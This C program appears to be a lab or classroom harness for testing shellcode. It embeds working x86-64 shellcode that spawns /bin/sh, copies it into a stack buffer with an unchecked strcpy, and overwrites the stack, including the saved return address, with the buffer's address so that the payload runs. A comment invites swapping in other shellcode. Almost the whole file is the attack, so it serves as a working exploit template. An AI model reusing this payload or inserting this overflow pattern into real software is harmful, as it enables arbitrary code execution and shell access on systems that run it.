#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long long *hold;
int i;

//Replace the below shell code with your shell code.
//char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90"
//"\x90\x90\x90\x90\x90\x90\x90\x90";
char shellcode[] ="\xeb\x1b\x5f\x45\x31\xd2\x44\x89\xd2\x44\x89\xd6\x67\x41\x8d\x42\x3b\x0f\x05\x44\x89\xd7\x67\x41\x8d\x42\x3c\x0f\x05\xe8\xe0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

unsigned long long get_sp(void) { 
  __asm__("movq %rsp,%rax"); 
} 



void dumb(char *arg)
{
  long long *test;
  hold=(unsigned long long *)&test;
  char filename[1024];   //Buffer to hold filename.
  printf("\nValue of Test:%llx",(unsigned long long)&test);
  printf("\nValue of filename[0]:%llx\n",(unsigned long long)filename);
  printf("The attack buffer is going to need to be a little bit bigger than:%llx\n",((unsigned long long)test-(unsigned long long)filename));
 
  strcpy (filename, shellcode);
  
  for (i=0;i<100;i++)
   {
     *hold=filename;
     hold=hold+1;
   }
  
  return;
}


int main(int argc, char* argv[])
{
  char holding[10000];        //This is just here as a buffer to try and keep you from overwriting main's return address, and into safe pages
  char *string;
  string=argv[1];             //string now points at the argument to main
  unsigned long long stack; 
  stack=get_sp();             //stack now points to the stack pointer.
  
    if(argc>1)                //Make sure that a filename was provided.
    {
      printf("\\Length of Input String:%d\\", strlen(string));
      dumb(argv[1]);   
    }
    else
      {
	printf("\n\nError: No Command Line arg for vuln was given\n\n");
	dumb("Useless Text");
      }
  return (0);
}
